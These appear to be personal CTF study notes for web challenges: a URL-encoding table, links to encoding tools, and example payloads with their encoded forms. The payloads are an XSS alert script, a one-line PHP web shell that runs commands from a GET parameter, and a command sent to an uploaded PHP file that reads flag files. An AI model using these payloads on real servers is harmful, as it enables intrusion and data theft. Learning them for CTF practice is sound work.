---
title: "My Web notes [Notes]"
toc: true
toc_label: "cat contents.md"
toc_icon: "terminal"
---
Small things you need to know for the web category in CTF ~~I guess~~.

# URL Encoded and Decoded

| Character | Encoded | Character | Encoded | Character | Encoded |
|-----------|---------|-----------|---------|-----------|---------|
| `space`   | %20     | `0`       | %30     | `@`       | %40     |
| `!`       | %21     | `1`       | %31     | `A-Z`     | %41-%5A |
| `"`       | %22     | `2`       | %32     | `[`       | %5B     |
| `#`       | %23     | `3`       | %33     | `\`       | %5C     |
| `$`       | %24     | `4`       | %34     | `]`       | %5D     |
| `%`       | %25     | `5`       | %35     | `^`       | %5E     |
| `&`       | %26     | `6`       | %36     | `_`       | %5F     |
| `'`       | %27     | `7`       | %37     | `backtick`| %60     |
| `(`       | %28     | `8`       | %38     | `a-z`     | %61-%7A |
| `)`       | %29     | `9`       | %39     | `{`       | %7B     |
| `*`       | %2A     | `:`       | %3A     | `pipe`    | %7C     |
| `+`       | %2B     | `;`       | %3B     | `}`       | %7D     |
| `,`       | %2C     | `<`       | %3C     | `~`       | %7E     |
| `-`       | %2D     | `=`       | %3D     |
| `.`       | %2E     | `>`       | %3E     |
| `/`       | %2F     | `?`       | %3F     |

Online Tool:

1. [URL-Encoder](https://www.urlencoder.org/)
2. [W3Schools-URL-Encoding-Map](https://www.w3schools.com/tags/ref_urlencode.ASP)

## Examples

```html
<!-- Example 1: XSS Common Payloads -->
1. <script>alert('XSS');</script>
2. javascript:alert('XSS');

<!-- Encoded results -->
1. %3Cscript%3Ealert%28%27XSS%27%29%3B%3C%2Fscript%3E
2. javascript%3Aalert%28%27XSS%27%29%3B
```

```php
// Example 2: PHP Common Payloads
<?php system($_GET['cmd']); ?>

// Encoded results
%3C%3Fphp%20system%28%24_GET%5B%27cmd%27%5D%29%3B%20%3F%3E

// Example 3: PHP Command Injection Payloads
GET /uploads/payload.PHP?cmd=
foreach (glob("../flag*") as $filename) 
{echo "$filename => ";var_dump(file_get_contents($filename));};

// Encoded results
GET /uploads/payload.PHP?cmd=
foreach%20(glob(%22..%2Fflag%2A%22)%20as%20%24filename)%20
%7Becho%20%22%24filename%20%3D%3E%20%22%3Bvar_dump(file_get_contents(%24filename))%3B%7D%3B
```

Updating...
